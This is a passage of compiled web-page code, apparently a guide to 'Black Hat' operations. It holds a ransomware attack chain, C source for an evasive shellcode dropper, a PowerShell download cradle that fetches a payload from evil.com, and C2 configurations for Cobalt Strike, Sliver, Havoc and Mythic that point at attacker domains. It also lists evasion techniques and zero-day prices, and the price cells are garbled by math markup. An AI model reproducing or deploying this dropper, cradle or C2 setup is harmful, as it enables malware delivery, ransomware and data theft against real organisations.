        children: "Phase 1: Reconnaissance\n├── Shodan search for exposed RDP on port 3389\n├── Search for VPN portals (Citrix, Pulse Secure)\n└── OSINT: LinkedIn for employees, email format verification\n\nPhase 2: Weaponization\n├── Purchase access from IAB on Russian Market ($3,000)\n├── Prepare Cobalt Strike beacon DLL\n└── Configure C2 profile with domain fronting (Cloudfront CDN)\n\nPhase 3: Delivery\n├── Spear-phish IT admin (impersonating CrowdStrike support)\n├── Malicious macro document: \"PaloAlto_Update.docm\"\n└── Payload hosted on compromised WordPress site\n\nPhase 4: Exploitation\n├── Macro executes PowerShell download cradle\n├── Cobalt Strike beacon DLL loaded in memory (fileless)\n└── C2 beacon established over HTTPS every 60 seconds\n\nPhase 5: Installation\n├── Service persistence via schtasks\n├── Secondary beacon via Cobalt Strike SMB listener (pivot)\n└── Registry Run key for backup persistence\n\nPhase 6: Command & Control\n├── Beacon traffic to redirector (AWS EC2 in us-east-1)\n├── Redirector proxies to team server (DigitalOcean - Amsterdam)\n└── Domain fronting via Cloudfront to avoid IP block\n\nPhase 7: Lateral Movement\n├── BloodHound collection: SharpHound.exe over SMB\n├── Pass-the-Hash via wmiexec to domain controller\n├── Dump LSASS on DC via Mimikatz\n└── Extract KRBTGT hash for Golden Ticket\n\nPhase 8: Actions on Objective\n├── Deploy LockBit ransomware via GPO push\n├── Exfiltrate 500GB via Rclone to MegaNZ\n├── Delete Volume Shadow Copies (vssadmin)\n├── Disable Windows Defender via registry\n└── Leave ransom note in every directory (Restore-My-Files.txt)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "14-malware-development",
      children: "1.4 Malware Development"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Professional Black Hat malware development involves multiple components working together."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Custom Droppers:"
      }), "\nA dropper is a lightweight executable that downloads and executes the main payload. Modern droppers use advanced evasion:"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-cpp",
        children: "// Custom dropper with API hashing and direct syscalls\n// Compile: x86_64-w64-mingw32-gcc -O2 dropper.c -o dropper.exe\n\n#include <windows.h>\n#include <winternl.h>\n\n// API hashing function - avoids import address table\nDWORD HashString(char* str) {\n    DWORD hash = 0;\n    while (*str) {\n        hash = (hash << 5) - hash + *str++;\n    }\n    return hash;\n}\n\n// Resolves function by hash to avoid import table\nLPVOID GetProcByHash(DWORD moduleHash, DWORD functionHash) {\n    PEB* peb = (PEB*)__readgsqword(0x60);\n    LDR_DATA_TABLE_ENTRY* entry;\n    // Walk PE loader data to find module this is in practice\n    // Simplified for demonstration\n    return GetProcAddress(NULL, \"VirtualAlloc\");\n}\n\n// Direct syscall via assembly stub (SysWhispers2 style)\n// Avoids ntdll.dll hooking\n__attribute__((naked)) NTSTATUS SysVirtualAlloc(\n    LPVOID lpAddress, SIZE_T dwSize,\n    DWORD flAllocationType, DWORD flProtect\n) {\n    __asm {\n        mov r10, rcx\n        mov eax, 0x18  // Syscall number for NtAllocateVirtualMemory\n        syscall\n        ret\n    }\n}\n\n// Decrypt payload with XOR\nvoid DecryptPayload(unsigned char* payload, DWORD size, unsigned char key) {\n    for (DWORD i = 0; i < size; i++) {\n        payload[i] ^= key;\n    }\n}\n\nint main() {\n    // Encrypted shellcode (XOR key 0xAA)\n    unsigned char encryptedShellcode[] = {\n        0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00\n        // ... shellcode encrypted with XOR 0xAA\n    };\n\n    // Allocate memory with RWX permissions\n    LPVOID execMem = VirtualAlloc(\n        NULL, sizeof(encryptedShellcode),\n        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE\n    );\n\n    if (!execMem) return 1;\n\n    // Decrypt in memory\n    DecryptPayload(encryptedShellcode, sizeof(encryptedShellcode), 0xAA);\n\n    // Copy to executable memory\n    memcpy(execMem, encryptedShellcode, sizeof(encryptedShellcode));\n\n    // Execute shellcode\n    EnumWindows((WNDENUMPROC)execMem, 0);\n\n    return 0;\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Packers and Crypters:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Packers:"
        }), " Compress executables to evade signature-based detection. Tools: UPX, MPRESS, Themida, VMProtect."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Crypters:"
        }), " Encrypt executables with a decryption stub that decrypts at runtime. Modern crypters use:\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Multiple encryption layers (AES-256 → RC4 → XOR)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Anti-debug (IsDebuggerPresent, NtGlobalFlag checks)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Anti-VM (MAC address check for VMware/VirtualBox)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Sandbox evasion (check uptime, CPU cores, RAM size)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Delay execution (Sleep with random offsets)"
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "FUD (Fully Undetected) Techniques:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Ambient API Calls:"
        }), " Using system API calls with normal arguments that decrypt/locate shellcode, avoiding suspicious patterns"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Process Hollowing:"
        }), " Create legitimate process (notepad.exe), unmapping its memory, writing malicious code into the empty process"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "DLL Sideloading:"
        }), " Place malicious DLL alongside legitimate EXE that loads it unsafely"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Reflective DLL Injection:"
        }), " DLL loaded directly from memory without going through LoadLibrary"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Alternative Function Calls:"
        }), " Using Indirect Syscalls (call ntdll functions with swapped function orders)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "ETW/AMSI Patching:"
        }), " Disabling Event Tracing for Windows and Antimalware Scan Interface"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "DInvoke:"
        }), " Dynamic invocation of unmanaged code from managed .NET code"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-powershell",
        children: "# Fileless PowerShell download cradle (used by many loaders)\npowershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand\n$client = New-Object System.Net.WebClient;\n$bytes = $client.DownloadData('http://evil.com/payload.bin');\n$decrypted = [System.Linq.Enumerable]::ToArray(\n    [System.Linq.Enumerable]::Select(\n        $bytes, [Func[int,int]]({ param($b) $b -bxor 0xAA })\n    )\n);\n$assembly = [System.Reflection.Assembly]::Load($decrypted);\n$assembly.EntryPoint.Invoke($null, (, [string[]] ('',)))\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "15-c2-frameworks",
      children: "1.5 C2 Frameworks"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Command & Control (C2) frameworks are the backbone of Black Hat operations, providing persistent access to compromised systems."
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Cobalt Strike (Commercial):"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Most widely used by both Red Teams and threat actors"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Features: Beacon (HTTP/HTTPS/DNS/SMB), Malleable C2 profiles, SOCKS proxy, lateral movement"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Aggressor Script for automation"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Used by: FIN7, APT29, Conti, many ransomware affiliates"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Price: $3,500/user/year (legitimate license), cracked versions on darknet"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Cobalt Strike Beacon Profile (example):\nset sample_name \"Microsoft Update Helper\";\nset sleeptime \"45000\";      # 45 second beacon interval\nset jitter \"15\";             # 15% jitter\nset useragent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\";\n\nhttp-get {\n    set uri \"/update/check\";\n    client {\n        header \"Accept\" \"text/html,application/xhtml+xml\";\n        metadata {\n            base64url;\n            prepend \"__cfduid=\";\n            header \"Cookie\";\n        }\n    }\n    server {\n        header \"Content-Type\" \"text/html\";\n        output {\n            netbios;\n            prepend \"window._cf_chl_f =\n'\";\n            append \"';window._cf_chl_opt={}}\";\n            print;\n        }\n    }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Sliver (Open Source - BishopFox):"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Modern, Go-based, free alternative to Cobalt Strike"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Supports: mTLS, HTTP(S), DNS, WireGuard"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Player mode for single-operator, Server mode for team ops"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Native implant generation for Windows, Linux, macOS"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Built-in staging, profiling, and pivoting"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Sliver server commands:\nsliver > generate --http evil.com --os windows --name implant01\nsliver > profiles new --mtls c2.evil.com:443 --skip-symbols beacon-win64\nsliver > https --domain c2.evil.com -L 0.0.0.0 -l 443\nsliver > jobs\nsliver > use <session-id>\nsliver > info\nsliver > shell\nsliver > execute-assembly /tmp/Seatbelt.exe\nsliver > socks5 start\nsliver > pivots\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Havoc (Open Source - C5pider):"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Modern C2 with a focus on evasion"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Uses: x64 position-independent code (PIC), sleep obfuscation, indirect syscalls"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Built-in Demon implant with extensive evasion"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Plugin system (Python, Go, C)"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Havoc teamserver config:\nListeners:\n  - Name: HTTPS_Listener\n    Protocol: HTTPS\n    Host: 0.0.0.0\n    Port: 443\n    Secure: true\n    Certificate:\n      Cert: /etc/letsencrypt/live/c2.evil.com/fullchain.pem\n      Key: /etc/letsencrypt/live/c2.evil.com/privkey.pem\n\nDemon config:\n  - Sleep: 30\n  - Jitter: 20\n  - KillDate: 2025-12-31\n  - WorkingDirectory: %TEMP%\n  - Injection: syscall\n  - SleepObfuscation: true\n  - IndirectSyscalls: true\n  - StackDuplication: true\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Empire (PowerShell/Python - BC Security):"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Post-exploitation framework using PowerShell (agent) and Python (server)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Module-based: keylog, screenshot, mimikatz integration"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "PowerShell without powershell.exe (using unmanaged PowerShell)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Less popular due to detection improvements, but still effective"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Covenant (.NET - Ryan Cobb):"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: ".NET C2 framework with extensive UI"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Uses HTTP/HTTPS listeners with Bridge listeners for staging"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Grunt implants (C#), GhostPack integration"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Profiles: Default, Customizable with YAML configuration"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Mythic (Cross-platform):"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Multi-agent C2 with web UI"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Supports multiple agent types (Apollo, Poseidon, Athena)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "C2 profiles for HTTP, HTTPS, DNS, SMB, and custom"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Dynamic agents compiled per-operator"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Mythic agent callback configuration:\n{\n    \"callback_host\": \"https://c2.evil.com\",\n    \"callback_interval\": 15,\n    \"callback_jitter\": 15,\n    \"encryption_key\": \"AES256Key-32Bytes\",\n    \"encryption_type\": \"aes256_hmac\",\n    \"get_requests_uri\": \"/news/feed/atom.xml\",\n    \"post_requests_uri\": \"/news/submitComment\",\n    \"user_agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\",\n    \"headers\": {\n        \"Accept\": \"text/html,application/xhtml+xml\",\n        \"Accept-Language\": \"en-US,en;q=0.9\"\n    }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "C2 Protocols and Evasion:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Protocol"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Use Case"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Detection Difficulty"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "HTTPS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Most common, blends with web traffic"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "DNS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Bypasses HTTP inspection, stealth"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hard (entropy analysis)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SMB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Internal network lateral movement"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "ICMP"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Limited bandwidth, exfiltration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "WebSocket"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Real-time bidirectional comms"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low-Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Custom"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Bespoke protocols, hard to signature"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Very Hard"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Domain Fronting:"
      }), "\nAbusing CDN infrastructure to hide true C2 destination. The C2 uses a legitimate CDN domain (cloudfront.net, azureedge.net) as the front domain while the actual C2 server sits behind the CDN."]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "HTTPS Request:\nClient connects to: https://cloudfront.net/update (front domain)\nCDN routes to: https://c2server.evil.com/update (hidden behind CDN)\n\nMitigation: CDNs now block domain fronting via SNI verification\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Redirectors:"
      }), "\nIntermediate servers that proxy traffic to hide the C2 server. A typical redirector chain might be:"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Victim → Compromised WordPress Site (redirector) → AWS EC2 (redirector) → C2 Team Server\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "CDN Abuse:"
      }), "\nUsing legitimate CDN services as proxies. Common techniques:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Cloudflare Workers (serverless functions acting as reverse proxy)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "AWS CloudFront with custom origins pointing to C2"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Azure Front Door CDN"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Fastly CDN edge compute"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "16-zero-day-discovery-and-exploit-brokers",
      children: "1.6 Zero-Day Discovery and Exploit Brokers"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Zero-Day Discovery:"
      }), "\nBlack Hat researchers (or legitimate researchers selling to brokers) find vulnerabilities through:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Source code audits (leaked or reverse-engineered)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Fuzzing (AFL, libFuzzer, Honggfuzz)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Patch diffing (comparing patched and unpatched binaries)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Reverse engineering of security updates"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Static analysis tools (IDA Pro, Ghidra, Binary Ninja)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Dynamic analysis (WinDbg, GDB, x64dbg)"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Zero-Day Pricing (based on observed market data):"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Target"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Price Range"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Browser (Chrome/Edge/Safari chain)"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "150"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        separator: "true",
                        children: ","
                      }), (0,jsx_runtime.jsx)(_components.mn, {
                        children: "000"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "150,000 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.8389em",
                      verticalAlign: "-0.1944em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "150"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mpunct",
                    children: ","
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mspace",
                    style: {
                      marginRight: "0.1667em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "000"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "500,000+"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "iOS/macOS"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "500"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        separator: "true",
                        children: ","
                      }), (0,jsx_runtime.jsx)(_components.mn, {
                        children: "000"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "500,000 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.8389em",
                      verticalAlign: "-0.1944em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "500"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mpunct",
                    children: ","
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mspace",
                    style: {
                      marginRight: "0.1667em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "000"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "2,000,000"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Android"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "100"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        separator: "true",
                        children: ","
                      }), (0,jsx_runtime.jsx)(_components.mn, {
                        children: "000"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "100,000 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.8389em",
                      verticalAlign: "-0.1944em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "100"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mpunct",
                    children: ","
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mspace",
                    style: {
                      marginRight: "0.1667em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "000"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "300,000"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Windows kernel"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "100"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        separator: "true",
                        children: ","
                      }), (0,jsx_runtime.jsx)(_components.mn, {
                        children: "000"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "100,000 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.8389em",
                      verticalAlign: "-0.1944em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "100"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mpunct",
                    children: ","
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mspace",
                    style: {
                      marginRight: "0.1667em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "000"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "200,000"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "MS Office chain"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "100"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        separator: "true",
